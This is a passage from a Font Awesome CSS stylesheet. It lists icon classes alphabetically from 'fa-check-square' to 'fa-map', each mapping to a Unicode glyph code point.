      }
      .fa-check-square:before {
          content: "\f14a";
      }
      .fa-cheese:before {
          content: "\f7ef";
      }
      .fa-chess:before {
          content: "\f439";
      }
      .fa-chess-bishop:before {
          content: "\f43a";
      }
      .fa-chess-board:before {
          content: "\f43c";
      }
      .fa-chess-king:before {
          content: "\f43f";
      }
      .fa-chess-knight:before {
          content: "\f441";
      }
      .fa-chess-pawn:before {
          content: "\f443";
      }
      .fa-chess-queen:before {
          content: "\f445";
      }
      .fa-chess-rook:before {
          content: "\f447";
      }
      .fa-chevron-circle-down:before {
          content: "\f13a";
      }
      .fa-chevron-circle-left:before {
          content: "\f137";
      }
      .fa-chevron-circle-right:before {
          content: "\f138";
      }
      .fa-chevron-circle-up:before {
          content: "\f139";
      }
      .fa-chevron-down:before {
          content: "\f078";
      }
      .fa-chevron-left:before {
          content: "\f053";
      }
      .fa-chevron-right:before {
          content: "\f054";
      }
      .fa-chevron-up:before {
          content: "\f077";
      }
      .fa-child:before {
          content: "\f1ae";
      }
      .fa-chrome:before {
          content: "\f268";
      }
      .fa-chromecast:before {
          content: "\f838";
      }
      .fa-church:before {
          content: "\f51d";
      }
      .fa-circle:before {
          content: "\f111";
      }
      .fa-circle-notch:before {
          content: "\f1ce";
      }
      .fa-city:before {
          content: "\f64f";
      }
      .fa-clinic-medical:before {
          content: "\f7f2";
      }
      .fa-clipboard:before {
          content: "\f328";
      }
      .fa-clipboard-check:before {
          content: "\f46c";
      }
      .fa-clipboard-list:before {
          content: "\f46d";
      }
      .fa-clock:before {
          content: "\f017";
      }
      .fa-clone:before {
          content: "\f24d";
      }
      .fa-closed-captioning:before {
          content: "\f20a";
      }
      .fa-cloud:before {
          content: "\f0c2";
      }
      .fa-cloud-download-alt:before {
          content: "\f381";
      }
      .fa-cloud-meatball:before {
          content: "\f73b";
      }
      .fa-cloud-moon:before {
          content: "\f6c3";
      }
      .fa-cloud-moon-rain:before {
          content: "\f73c";
      }
      .fa-cloud-rain:before {
          content: "\f73d";
      }
      .fa-cloud-showers-heavy:before {
          content: "\f740";
      }
      .fa-cloud-sun:before {
          content: "\f6c4";
      }
      .fa-cloud-sun-rain:before {
          content: "\f743";
      }
      .fa-cloud-upload-alt:before {
          content: "\f382";
      }
      .fa-cloudflare:before {
          content: "\e07d";
      }
      .fa-cloudscale:before {
          content: "\f383";
      }
      .fa-cloudsmith:before {
          content: "\f384";
      }
      .fa-cloudversify:before {
          content: "\f385";
      }
      .fa-cocktail:before {
          content: "\f561";
      }
      .fa-code:before {
          content: "\f121";
      }
      .fa-code-branch:before {
          content: "\f126";
      }
      .fa-codepen:before {
          content: "\f1cb";
      }
      .fa-codiepie:before {
          content: "\f284";
      }
      .fa-coffee:before {
          content: "\f0f4";
      }
      .fa-cog:before {
          content: "\f013";
      }
      .fa-cogs:before {
          content: "\f085";
      }
      .fa-coins:before {
          content: "\f51e";
      }
      .fa-columns:before {
          content: "\f0db";
      }
      .fa-comment:before {
          content: "\f075";
      }
      .fa-comment-alt:before {
          content: "\f27a";
      }
      .fa-comment-dollar:before {
          content: "\f651";
      }
      .fa-comment-dots:before {
          content: "\f4ad";
      }
      .fa-comment-medical:before {
          content: "\f7f5";
      }
      .fa-comment-slash:before {
          content: "\f4b3";
      }
      .fa-comments:before {
          content: "\f086";
      }
      .fa-comments-dollar:before {
          content: "\f653";
      }
      .fa-compact-disc:before {
          content: "\f51f";
      }
      .fa-compass:before {
          content: "\f14e";
      }
      .fa-compress:before {
          content: "\f066";
      }
      .fa-compress-alt:before {
          content: "\f422";
      }
      .fa-compress-arrows-alt:before {
          content: "\f78c";
      }
      .fa-concierge-bell:before {
          content: "\f562";
      }
      .fa-confluence:before {
          content: "\f78d";
      }
      .fa-connectdevelop:before {
          content: "\f20e";
      }
      .fa-contao:before {
          content: "\f26d";
      }
      .fa-cookie:before {
          content: "\f563";
      }
      .fa-cookie-bite:before {
          content: "\f564";
      }
      .fa-copy:before {
          content: "\f0c5";
      }
      .fa-copyright:before {
          content: "\f1f9";
      }
      .fa-cotton-bureau:before {
          content: "\f89e";
      }
      .fa-couch:before {
          content: "\f4b8";
      }
      .fa-cpanel:before {
          content: "\f388";
      }
      .fa-creative-commons:before {
          content: "\f25e";
      }
      .fa-creative-commons-by:before {
          content: "\f4e7";
      }
      .fa-creative-commons-nc:before {
          content: "\f4e8";
      }
      .fa-creative-commons-nc-eu:before {
          content: "\f4e9";
      }
      .fa-creative-commons-nc-jp:before {
          content: "\f4ea";
      }
      .fa-creative-commons-nd:before {
          content: "\f4eb";
      }
      .fa-creative-commons-pd:before {
          content: "\f4ec";
      }
      .fa-creative-commons-pd-alt:before {
          content: "\f4ed";
      }
      .fa-creative-commons-remix:before {
          content: "\f4ee";
      }
      .fa-creative-commons-sa:before {
          content: "\f4ef";
      }
      .fa-creative-commons-sampling:before {
          content: "\f4f0";
      }
      .fa-creative-commons-sampling-plus:before {
          content: "\f4f1";
      }
      .fa-creative-commons-share:before {
          content: "\f4f2";
      }
      .fa-creative-commons-zero:before {
          content: "\f4f3";
      }
      .fa-credit-card:before {
          content: "\f09d";
      }
      .fa-critical-role:before {
          content: "\f6c9";
      }
      .fa-crop:before {
          content: "\f125";
      }
      .fa-crop-alt:before {
          content: "\f565";
      }
      .fa-cross:before {
          content: "\f654";
      }
      .fa-crosshairs:before {
          content: "\f05b";
      }
      .fa-crow:before {
          content: "\f520";
      }
      .fa-crown:before {
          content: "\f521";
      }
      .fa-crutch:before {
          content: "\f7f7";
      }
      .fa-css3:before {
          content: "\f13c";
      }
      .fa-css3-alt:before {
          content: "\f38b";
      }
      .fa-cube:before {
          content: "\f1b2";
      }
      .fa-cubes:before {
          content: "\f1b3";
      }
      .fa-cut:before {
          content: "\f0c4";
      }
      .fa-cuttlefish:before {
          content: "\f38c";
      }
      .fa-d-and-d:before {
          content: "\f38d";
      }
      .fa-d-and-d-beyond:before {
          content: "\f6ca";
      }
      .fa-dailymotion:before {
          content: "\e052";
      }
      .fa-dashcube:before {
          content: "\f210";
      }
      .fa-database:before {
          content: "\f1c0";
      }
      .fa-deaf:before {
          content: "\f2a4";
      }
      .fa-deezer:before {
          content: "\e077";
      }
      .fa-delicious:before {
          content: "\f1a5";
      }
      .fa-democrat:before {
          content: "\f747";
      }
      .fa-deploydog:before {
          content: "\f38e";
      }
      .fa-deskpro:before {
          content: "\f38f";
      }
      .fa-desktop:before {
          content: "\f108";
      }
      .fa-dev:before {
          content: "\f6cc";
      }
      .fa-deviantart:before {
          content: "\f1bd";
      }
      .fa-dharmachakra:before {
          content: "\f655";
      }
      .fa-dhl:before {
          content: "\f790";
      }
      .fa-diagnoses:before {
          content: "\f470";
      }
      .fa-diaspora:before {
          content: "\f791";
      }
      .fa-dice:before {
          content: "\f522";
      }
      .fa-dice-d20:before {
          content: "\f6cf";
      }
      .fa-dice-d6:before {
          content: "\f6d1";
      }
      .fa-dice-five:before {
          content: "\f523";
      }
      .fa-dice-four:before {
          content: "\f524";
      }
      .fa-dice-one:before {
          content: "\f525";
      }
      .fa-dice-six:before {
          content: "\f526";
      }
      .fa-dice-three:before {
          content: "\f527";
      }
      .fa-dice-two:before {
          content: "\f528";
      }
      .fa-digg:before {
          content: "\f1a6";
      }
      .fa-digital-ocean:before {
          content: "\f391";
      }
      .fa-digital-tachograph:before {
          content: "\f566";
      }
      .fa-directions:before {
          content: "\f5eb";
      }
      .fa-discord:before {
          content: "\f392";
      }
      .fa-discourse:before {
          content: "\f393";
      }
      .fa-disease:before {
          content: "\f7fa";
      }
      .fa-divide:before {
          content: "\f529";
      }
      .fa-dizzy:before {
          content: "\f567";
      }
      .fa-dna:before {
          content: "\f471";
      }
      .fa-dochub:before {
          content: "\f394";
      }
      .fa-docker:before {
          content: "\f395";
      }
      .fa-dog:before {
          content: "\f6d3";
      }
      .fa-dollar-sign:before {
          content: "\f155";
      }
      .fa-dolly:before {
          content: "\f472";
      }
      .fa-dolly-flatbed:before {
          content: "\f474";
      }
      .fa-donate:before {
          content: "\f4b9";
      }
      .fa-door-closed:before {
          content: "\f52a";
      }
      .fa-door-open:before {
          content: "\f52b";
      }
      .fa-dot-circle:before {
          content: "\f192";
      }
      .fa-dove:before {
          content: "\f4ba";
      }
      .fa-download:before {
          content: "\f019";
      }
      .fa-draft2digital:before {
          content: "\f396";
      }
      .fa-drafting-compass:before {
          content: "\f568";
      }
      .fa-dragon:before {
          content: "\f6d5";
      }
      .fa-draw-polygon:before {
          content: "\f5ee";
      }
      .fa-dribbble:before {
          content: "\f17d";
      }
      .fa-dribbble-square:before {
          content: "\f397";
      }
      .fa-dropbox:before {
          content: "\f16b";
      }
      .fa-drum:before {
          content: "\f569";
      }
      .fa-drum-steelpan:before {
          content: "\f56a";
      }
      .fa-drumstick-bite:before {
          content: "\f6d7";
      }
      .fa-drupal:before {
          content: "\f1a9";
      }
      .fa-dumbbell:before {
          content: "\f44b";
      }
      .fa-dumpster:before {
          content: "\f793";
      }
      .fa-dumpster-fire:before {
          content: "\f794";
      }
      .fa-dungeon:before {
          content: "\f6d9";
      }
      .fa-dyalog:before {
          content: "\f399";
      }
      .fa-earlybirds:before {
          content: "\f39a";
      }
      .fa-ebay:before {
          content: "\f4f4";
      }
      .fa-edge:before {
          content: "\f282";
      }
      .fa-edge-legacy:before {
          content: "\e078";
      }
      .fa-edit:before {
          content: "\f044";
      }
      .fa-egg:before {
          content: "\f7fb";
      }
      .fa-eject:before {
          content: "\f052";
      }
      .fa-elementor:before {
          content: "\f430";
      }
      .fa-ellipsis-h:before {
          content: "\f141";
      }
      .fa-ellipsis-v:before {
          content: "\f142";
      }
      .fa-ello:before {
          content: "\f5f1";
      }
      .fa-ember:before {
          content: "\f423";
      }
      .fa-empire:before {
          content: "\f1d1";
      }
      .fa-envelope:before {
          content: "\f0e0";
      }
      .fa-envelope-open:before {
          content: "\f2b6";
      }
      .fa-envelope-open-text:before {
          content: "\f658";
      }
      .fa-envelope-square:before {
          content: "\f199";
      }
      .fa-envira:before {
          content: "\f299";
      }
      .fa-equals:before {
          content: "\f52c";
      }
      .fa-eraser:before {
          content: "\f12d";
      }
      .fa-erlang:before {
          content: "\f39d";
      }
      .fa-ethereum:before {
          content: "\f42e";
      }
      .fa-ethernet:before {
          content: "\f796";
      }
      .fa-etsy:before {
          content: "\f2d7";
      }
      .fa-euro-sign:before {
          content: "\f153";
      }
      .fa-evernote:before {
          content: "\f839";
      }
      .fa-exchange-alt:before {
          content: "\f362";
      }
      .fa-exclamation:before {
          content: "\f12a";
      }
      .fa-exclamation-circle:before {
          content: "\f06a";
      }
      .fa-exclamation-triangle:before {
          content: "\f071";
      }
      .fa-expand:before {
          content: "\f065";
      }
      .fa-expand-alt:before {
          content: "\f424";
      }
      .fa-expand-arrows-alt:before {
          content: "\f31e";
      }
      .fa-expeditedssl:before {
          content: "\f23e";
      }
      .fa-external-link-alt:before {
          content: "\f35d";
      }
      .fa-external-link-square-alt:before {
          content: "\f360";
      }
      .fa-eye:before {
          content: "\f06e";
      }
      .fa-eye-dropper:before {
          content: "\f1fb";
      }
      .fa-eye-slash:before {
          content: "\f070";
      }
      .fa-facebook:before {
          content: "\f09a";
      }
      .fa-facebook-f:before {
          content: "\f39e";
      }
      .fa-facebook-messenger:before {
          content: "\f39f";
      }
      .fa-facebook-square:before {
          content: "\f082";
      }
      .fa-fan:before {
          content: "\f863";
      }
      .fa-fantasy-flight-games:before {
          content: "\f6dc";
      }
      .fa-fast-backward:before {
          content: "\f049";
      }
      .fa-fast-forward:before {
          content: "\f050";
      }
      .fa-faucet:before {
          content: "\e005";
      }
      .fa-fax:before {
          content: "\f1ac";
      }
      .fa-feather:before {
          content: "\f52d";
      }
      .fa-feather-alt:before {
          content: "\f56b";
      }
      .fa-fedex:before {
          content: "\f797";
      }
      .fa-fedora:before {
          content: "\f798";
      }
      .fa-female:before {
          content: "\f182";
      }
      .fa-fighter-jet:before {
          content: "\f0fb";
      }
      .fa-figma:before {
          content: "\f799";
      }
      .fa-file:before {
          content: "\f15b";
      }
      .fa-file-alt:before {
          content: "\f15c";
      }
      .fa-file-archive:before {
          content: "\f1c6";
      }
      .fa-file-audio:before {
          content: "\f1c7";
      }
      .fa-file-code:before {
          content: "\f1c9";
      }
      .fa-file-contract:before {
          content: "\f56c";
      }
      .fa-file-csv:before {
          content: "\f6dd";
      }
      .fa-file-download:before {
          content: "\f56d";
      }
      .fa-file-excel:before {
          content: "\f1c3";
      }
      .fa-file-export:before {
          content: "\f56e";
      }
      .fa-file-image:before {
          content: "\f1c5";
      }
      .fa-file-import:before {
          content: "\f56f";
      }
      .fa-file-invoice:before {
          content: "\f570";
      }
      .fa-file-invoice-dollar:before {
          content: "\f571";
      }
      .fa-file-medical:before {
          content: "\f477";
      }
      .fa-file-medical-alt:before {
          content: "\f478";
      }
      .fa-file-pdf:before {
          content: "\f1c1";
      }
      .fa-file-powerpoint:before {
          content: "\f1c4";
      }
      .fa-file-prescription:before {
          content: "\f572";
      }
      .fa-file-signature:before {
          content: "\f573";
      }
      .fa-file-upload:before {
          content: "\f574";
      }
      .fa-file-video:before {
          content: "\f1c8";
      }
      .fa-file-word:before {
          content: "\f1c2";
      }
      .fa-fill:before {
          content: "\f575";
      }
      .fa-fill-drip:before {
          content: "\f576";
      }
      .fa-film:before {
          content: "\f008";
      }
      .fa-filter:before {
          content: "\f0b0";
      }
      .fa-fingerprint:before {
          content: "\f577";
      }
      .fa-fire:before {
          content: "\f06d";
      }
      .fa-fire-alt:before {
          content: "\f7e4";
      }
      .fa-fire-extinguisher:before {
          content: "\f134";
      }
      .fa-firefox:before {
          content: "\f269";
      }
      .fa-firefox-browser:before {
          content: "\e007";
      }
      .fa-first-aid:before {
          content: "\f479";
      }
      .fa-first-order:before {
          content: "\f2b0";
      }
      .fa-first-order-alt:before {
          content: "\f50a";
      }
      .fa-firstdraft:before {
          content: "\f3a1";
      }
      .fa-fish:before {
          content: "\f578";
      }
      .fa-fist-raised:before {
          content: "\f6de";
      }
      .fa-flag:before {
          content: "\f024";
      }
      .fa-flag-checkered:before {
          content: "\f11e";
      }
      .fa-flag-usa:before {
          content: "\f74d";
      }
      .fa-flask:before {
          content: "\f0c3";
      }
      .fa-flickr:before {
          content: "\f16e";
      }
      .fa-flipboard:before {
          content: "\f44d";
      }
      .fa-flushed:before {
          content: "\f579";
      }
      .fa-fly:before {
          content: "\f417";
      }
      .fa-folder:before {
          content: "\f07b";
      }
      .fa-folder-minus:before {
          content: "\f65d";
      }
      .fa-folder-open:before {
          content: "\f07c";
      }
      .fa-folder-plus:before {
          content: "\f65e";
      }
      .fa-font:before {
          content: "\f031";
      }
      .fa-font-awesome:before {
          content: "\f2b4";
      }
      .fa-font-awesome-alt:before {
          content: "\f35c";
      }
      .fa-font-awesome-flag:before {
          content: "\f425";
      }
      .fa-font-awesome-logo-full:before {
          content: "\f4e6";
      }
      .fa-fonticons:before {
          content: "\f280";
      }
      .fa-fonticons-fi:before {
          content: "\f3a2";
      }
      .fa-football-ball:before {
          content: "\f44e";
      }
      .fa-fort-awesome:before {
          content: "\f286";
      }
      .fa-fort-awesome-alt:before {
          content: "\f3a3";
      }
      .fa-forumbee:before {
          content: "\f211";
      }
      .fa-forward:before {
          content: "\f04e";
      }
      .fa-foursquare:before {
          content: "\f180";
      }
      .fa-free-code-camp:before {
          content: "\f2c5";
      }
      .fa-freebsd:before {
          content: "\f3a4";
      }
      .fa-frog:before {
          content: "\f52e";
      }
      .fa-frown:before {
          content: "\f119";
      }
      .fa-frown-open:before {
          content: "\f57a";
      }
      .fa-fulcrum:before {
          content: "\f50b";
      }
      .fa-funnel-dollar:before {
          content: "\f662";
      }
      .fa-futbol:before {
          content: "\f1e3";
      }
      .fa-galactic-republic:before {
          content: "\f50c";
      }
      .fa-galactic-senate:before {
          content: "\f50d";
      }
      .fa-gamepad:before {
          content: "\f11b";
      }
      .fa-gas-pump:before {
          content: "\f52f";
      }
      .fa-gavel:before {
          content: "\f0e3";
      }
      .fa-gem:before {
          content: "\f3a5";
      }
      .fa-genderless:before {
          content: "\f22d";
      }
      .fa-get-pocket:before {
          content: "\f265";
      }
      .fa-gg:before {
          content: "\f260";
      }
      .fa-gg-circle:before {
          content: "\f261";
      }
      .fa-ghost:before {
          content: "\f6e2";
      }
      .fa-gift:before {
          content: "\f06b";
      }
      .fa-gifts:before {
          content: "\f79c";
      }
      .fa-git:before {
          content: "\f1d3";
      }
      .fa-git-alt:before {
          content: "\f841";
      }
      .fa-git-square:before {
          content: "\f1d2";
      }
      .fa-github:before {
          content: "\f09b";
      }
      .fa-github-alt:before {
          content: "\f113";
      }
      .fa-github-square:before {
          content: "\f092";
      }
      .fa-gitkraken:before {
          content: "\f3a6";
      }
      .fa-gitlab:before {
          content: "\f296";
      }
      .fa-gitter:before {
          content: "\f426";
      }
      .fa-glass-cheers:before {
          content: "\f79f";
      }
      .fa-glass-martini:before {
          content: "\f000";
      }
      .fa-glass-martini-alt:before {
          content: "\f57b";
      }
      .fa-glass-whiskey:before {
          content: "\f7a0";
      }
      .fa-glasses:before {
          content: "\f530";
      }
      .fa-glide:before {
          content: "\f2a5";
      }
      .fa-glide-g:before {
          content: "\f2a6";
      }
      .fa-globe:before {
          content: "\f0ac";
      }
      .fa-globe-africa:before {
          content: "\f57c";
      }
      .fa-globe-americas:before {
          content: "\f57d";
      }
      .fa-globe-asia:before {
          content: "\f57e";
      }
      .fa-globe-europe:before {
          content: "\f7a2";
      }
      .fa-gofore:before {
          content: "\f3a7";
      }
      .fa-golf-ball:before {
          content: "\f450";
      }
      .fa-goodreads:before {
          content: "\f3a8";
      }
      .fa-goodreads-g:before {
          content: "\f3a9";
      }
      .fa-google:before {
          content: "\f1a0";
      }
      .fa-google-drive:before {
          content: "\f3aa";
      }
      .fa-google-pay:before {
          content: "\e079";
      }
      .fa-google-play:before {
          content: "\f3ab";
      }
      .fa-google-plus:before {
          content: "\f2b3";
      }
      .fa-google-plus-g:before {
          content: "\f0d5";
      }
      .fa-google-plus-square:before {
          content: "\f0d4";
      }
      .fa-google-wallet:before {
          content: "\f1ee";
      }
      .fa-gopuram:before {
          content: "\f664";
      }
      .fa-graduation-cap:before {
          content: "\f19d";
      }
      .fa-gratipay:before {
          content: "\f184";
      }
      .fa-grav:before {
          content: "\f2d6";
      }
      .fa-greater-than:before {
          content: "\f531";
      }
      .fa-greater-than-equal:before {
          content: "\f532";
      }
      .fa-grimace:before {
          content: "\f57f";
      }
      .fa-grin:before {
          content: "\f580";
      }
      .fa-grin-alt:before {
          content: "\f581";
      }
      .fa-grin-beam:before {
          content: "\f582";
      }
      .fa-grin-beam-sweat:before {
          content: "\f583";
      }
      .fa-grin-hearts:before {
          content: "\f584";
      }
      .fa-grin-squint:before {
          content: "\f585";
      }
      .fa-grin-squint-tears:before {
          content: "\f586";
      }
      .fa-grin-stars:before {
          content: "\f587";
      }
      .fa-grin-tears:before {
          content: "\f588";
      }
      .fa-grin-tongue:before {
          content: "\f589";
      }
      .fa-grin-tongue-squint:before {
          content: "\f58a";
      }
      .fa-grin-tongue-wink:before {
          content: "\f58b";
      }
      .fa-grin-wink:before {
          content: "\f58c";
      }
      .fa-grip-horizontal:before {
          content: "\f58d";
      }
      .fa-grip-lines:before {
          content: "\f7a4";
      }
      .fa-grip-lines-vertical:before {
          content: "\f7a5";
      }
      .fa-grip-vertical:before {
          content: "\f58e";
      }
      .fa-gripfire:before {
          content: "\f3ac";
      }
      .fa-grunt:before {
          content: "\f3ad";
      }
      .fa-guilded:before {
          content: "\e07e";
      }
      .fa-guitar:before {
          content: "\f7a6";
      }
      .fa-gulp:before {
          content: "\f3ae";
      }
      .fa-h-square:before {
          content: "\f0fd";
      }
      .fa-hacker-news:before {
          content: "\f1d4";
      }
      .fa-hacker-news-square:before {
          content: "\f3af";
      }
      .fa-hackerrank:before {
          content: "\f5f7";
      }
      .fa-hamburger:before {
          content: "\f805";
      }
      .fa-hammer:before {
          content: "\f6e3";
      }
      .fa-hamsa:before {
          content: "\f665";
      }
      .fa-hand-holding:before {
          content: "\f4bd";
      }
      .fa-hand-holding-heart:before {
          content: "\f4be";
      }
      .fa-hand-holding-medical:before {
          content: "\e05c";
      }
      .fa-hand-holding-usd:before {
          content: "\f4c0";
      }
      .fa-hand-holding-water:before {
          content: "\f4c1";
      }
      .fa-hand-lizard:before {
          content: "\f258";
      }
      .fa-hand-middle-finger:before {
          content: "\f806";
      }
      .fa-hand-paper:before {
          content: "\f256";
      }
      .fa-hand-peace:before {
          content: "\f25b";
      }
      .fa-hand-point-down:before {
          content: "\f0a7";
      }
      .fa-hand-point-left:before {
          content: "\f0a5";
      }
      .fa-hand-point-right:before {
          content: "\f0a4";
      }
      .fa-hand-point-up:before {
          content: "\f0a6";
      }
      .fa-hand-pointer:before {
          content: "\f25a";
      }
      .fa-hand-rock:before {
          content: "\f255";
      }
      .fa-hand-scissors:before {
          content: "\f257";
      }
      .fa-hand-sparkles:before {
          content: "\e05d";
      }
      .fa-hand-spock:before {
          content: "\f259";
      }
      .fa-hands:before {
          content: "\f4c2";
      }
      .fa-hands-helping:before {
          content: "\f4c4";
      }
      .fa-hands-wash:before {
          content: "\e05e";
      }
      .fa-handshake:before {
          content: "\f2b5";
      }
      .fa-handshake-alt-slash:before {
          content: "\e05f";
      }
      .fa-handshake-slash:before {
          content: "\e060";
      }
      .fa-hanukiah:before {
          content: "\f6e6";
      }
      .fa-hard-hat:before {
          content: "\f807";
      }
      .fa-hashtag:before {
          content: "\f292";
      }
      .fa-hat-cowboy:before {
          content: "\f8c0";
      }
      .fa-hat-cowboy-side:before {
          content: "\f8c1";
      }
      .fa-hat-wizard:before {
          content: "\f6e8";
      }
      .fa-hdd:before {
          content: "\f0a0";
      }
      .fa-head-side-cough:before {
          content: "\e061";
      }
      .fa-head-side-cough-slash:before {
          content: "\e062";
      }
      .fa-head-side-mask:before {
          content: "\e063";
      }
      .fa-head-side-virus:before {
          content: "\e064";
      }
      .fa-heading:before {
          content: "\f1dc";
      }
      .fa-headphones:before {
          content: "\f025";
      }
      .fa-headphones-alt:before {
          content: "\f58f";
      }
      .fa-headset:before {
          content: "\f590";
      }
      .fa-heart:before {
          content: "\f004";
      }
      .fa-heart-broken:before {
          content: "\f7a9";
      }
      .fa-heartbeat:before {
          content: "\f21e";
      }
      .fa-helicopter:before {
          content: "\f533";
      }
      .fa-highlighter:before {
          content: "\f591";
      }
      .fa-hiking:before {
          content: "\f6ec";
      }
      .fa-hippo:before {
          content: "\f6ed";
      }
      .fa-hips:before {
          content: "\f452";
      }
      .fa-hire-a-helper:before {
          content: "\f3b0";
      }
      .fa-history:before {
          content: "\f1da";
      }
      .fa-hive:before {
          content: "\e07f";
      }
      .fa-hockey-puck:before {
          content: "\f453";
      }
      .fa-holly-berry:before {
          content: "\f7aa";
      }
      .fa-home:before {
          content: "\f015";
      }
      .fa-hooli:before {
          content: "\f427";
      }
      .fa-hornbill:before {
          content: "\f592";
      }
      .fa-horse:before {
          content: "\f6f0";
      }
      .fa-horse-head:before {
          content: "\f7ab";
      }
      .fa-hospital:before {
          content: "\f0f8";
      }
      .fa-hospital-alt:before {
          content: "\f47d";
      }
      .fa-hospital-symbol:before {
          content: "\f47e";
      }
      .fa-hospital-user:before {
          content: "\f80d";
      }
      .fa-hot-tub:before {
          content: "\f593";
      }
      .fa-hotdog:before {
          content: "\f80f";
      }
      .fa-hotel:before {
          content: "\f594";
      }
      .fa-hotjar:before {
          content: "\f3b1";
      }
      .fa-hourglass:before {
          content: "\f254";
      }
      .fa-hourglass-end:before {
          content: "\f253";
      }
      .fa-hourglass-half:before {
          content: "\f252";
      }
      .fa-hourglass-start:before {
          content: "\f251";
      }
      .fa-house-damage:before {
          content: "\f6f1";
      }
      .fa-house-user:before {
          content: "\e065";
      }
      .fa-houzz:before {
          content: "\f27c";
      }
      .fa-hryvnia:before {
          content: "\f6f2";
      }
      .fa-html5:before {
          content: "\f13b";
      }
      .fa-hubspot:before {
          content: "\f3b2";
      }
      .fa-i-cursor:before {
          content: "\f246";
      }
      .fa-ice-cream:before {
          content: "\f810";
      }
      .fa-icicles:before {
          content: "\f7ad";
      }
      .fa-icons:before {
          content: "\f86d";
      }
      .fa-id-badge:before {
          content: "\f2c1";
      }
      .fa-id-card:before {
          content: "\f2c2";
      }
      .fa-id-card-alt:before {
          content: "\f47f";
      }
      .fa-ideal:before {
          content: "\e013";
      }
      .fa-igloo:before {
          content: "\f7ae";
      }
      .fa-image:before {
          content: "\f03e";
      }
      .fa-images:before {
          content: "\f302";
      }
      .fa-imdb:before {
          content: "\f2d8";
      }
      .fa-inbox:before {
          content: "\f01c";
      }
      .fa-indent:before {
          content: "\f03c";
      }
      .fa-industry:before {
          content: "\f275";
      }
      .fa-infinity:before {
          content: "\f534";
      }
      .fa-info:before {
          content: "\f129";
      }
      .fa-info-circle:before {
          content: "\f05a";
      }
      .fa-innosoft:before {
          content: "\e080";
      }
      .fa-instagram:before {
          content: "\f16d";
      }
      .fa-instagram-square:before {
          content: "\e055";
      }
      .fa-instalod:before {
          content: "\e081";
      }
      .fa-intercom:before {
          content: "\f7af";
      }
      .fa-internet-explorer:before {
          content: "\f26b";
      }
      .fa-invision:before {
          content: "\f7b0";
      }
      .fa-ioxhost:before {
          content: "\f208";
      }
      .fa-italic:before {
          content: "\f033";
      }
      .fa-itch-io:before {
          content: "\f83a";
      }
      .fa-itunes:before {
          content: "\f3b4";
      }
      .fa-itunes-note:before {
          content: "\f3b5";
      }
      .fa-java:before {
          content: "\f4e4";
      }
      .fa-jedi:before {
          content: "\f669";
      }
      .fa-jedi-order:before {
          content: "\f50e";
      }
      .fa-jenkins:before {
          content: "\f3b6";
      }
      .fa-jira:before {
          content: "\f7b1";
      }
      .fa-joget:before {
          content: "\f3b7";
      }
      .fa-joint:before {
          content: "\f595";
      }
      .fa-joomla:before {
          content: "\f1aa";
      }
      .fa-journal-whills:before {
          content: "\f66a";
      }
      .fa-js:before {
          content: "\f3b8";
      }
      .fa-js-square:before {
          content: "\f3b9";
      }
      .fa-jsfiddle:before {
          content: "\f1cc";
      }
      .fa-kaaba:before {
          content: "\f66b";
      }
      .fa-kaggle:before {
          content: "\f5fa";
      }
      .fa-key:before {
          content: "\f084";
      }
      .fa-keybase:before {
          content: "\f4f5";
      }
      .fa-keyboard:before {
          content: "\f11c";
      }
      .fa-keycdn:before {
          content: "\f3ba";
      }
      .fa-khanda:before {
          content: "\f66d";
      }
      .fa-kickstarter:before {
          content: "\f3bb";
      }
      .fa-kickstarter-k:before {
          content: "\f3bc";
      }
      .fa-kiss:before {
          content: "\f596";
      }
      .fa-kiss-beam:before {
          content: "\f597";
      }
      .fa-kiss-wink-heart:before {
          content: "\f598";
      }
      .fa-kiwi-bird:before {
          content: "\f535";
      }
      .fa-korvue:before {
          content: "\f42f";
      }
      .fa-landmark:before {
          content: "\f66f";
      }
      .fa-language:before {
          content: "\f1ab";
      }
      .fa-laptop:before {
          content: "\f109";
      }
      .fa-laptop-code:before {
          content: "\f5fc";
      }
      .fa-laptop-house:before {
          content: "\e066";
      }
      .fa-laptop-medical:before {
          content: "\f812";
      }
      .fa-laravel:before {
          content: "\f3bd";
      }
      .fa-lastfm:before {
          content: "\f202";
      }
      .fa-lastfm-square:before {
          content: "\f203";
      }
      .fa-laugh:before {
          content: "\f599";
      }
      .fa-laugh-beam:before {
          content: "\f59a";
      }
      .fa-laugh-squint:before {
          content: "\f59b";
      }
      .fa-laugh-wink:before {
          content: "\f59c";
      }
      .fa-layer-group:before {
          content: "\f5fd";
      }
      .fa-leaf:before {
          content: "\f06c";
      }
      .fa-leanpub:before {
          content: "\f212";
      }
      .fa-lemon:before {
          content: "\f094";
      }
      .fa-less:before {
          content: "\f41d";
      }
      .fa-less-than:before {
          content: "\f536";
      }
      .fa-less-than-equal:before {
          content: "\f537";
      }
      .fa-level-down-alt:before {
          content: "\f3be";
      }
      .fa-level-up-alt:before {
          content: "\f3bf";
      }
      .fa-life-ring:before {
          content: "\f1cd";
      }
      .fa-lightbulb:before {
          content: "\f0eb";
      }
      .fa-line:before {
          content: "\f3c0";
      }
      .fa-link:before {
          content: "\f0c1";
      }
      .fa-linkedin:before {
          content: "\f08c";
      }
      .fa-linkedin-in:before {
          content: "\f0e1";
      }
      .fa-linode:before {
          content: "\f2b8";
      }
      .fa-linux:before {
          content: "\f17c";
      }
      .fa-lira-sign:before {
          content: "\f195";
      }
      .fa-list:before {
          content: "\f03a";
      }
      .fa-list-alt:before {
          content: "\f022";
      }
      .fa-list-ol:before {
          content: "\f0cb";
      }
      .fa-list-ul:before {
          content: "\f0ca";
      }
      .fa-location-arrow:before {
          content: "\f124";
      }
      .fa-lock:before {
          content: "\f023";
      }
      .fa-lock-open:before {
          content: "\f3c1";
      }
      .fa-long-arrow-alt-down:before {
          content: "\f309";
      }
      .fa-long-arrow-alt-left:before {
          content: "\f30a";
      }
      .fa-long-arrow-alt-right:before {
          content: "\f30b";
      }
      .fa-long-arrow-alt-up:before {
          content: "\f30c";
      }
      .fa-low-vision:before {
          content: "\f2a8";
      }
      .fa-luggage-cart:before {
          content: "\f59d";
      }
      .fa-lungs:before {
          content: "\f604";
      }
      .fa-lungs-virus:before {
          content: "\e067";
      }
      .fa-lyft:before {
          content: "\f3c3";
      }
      .fa-magento:before {
          content: "\f3c4";
      }
      .fa-magic:before {
          content: "\f0d0";
      }
      .fa-magnet:before {
          content: "\f076";
      }
      .fa-mail-bulk:before {
          content: "\f674";
      }
      .fa-mailchimp:before {
          content: "\f59e";
      }
      .fa-male:before {
          content: "\f183";
      }
      .fa-mandalorian:before {
          content: "\f50f";
      }
      .fa-map:before {
          content: "\f279";
      }
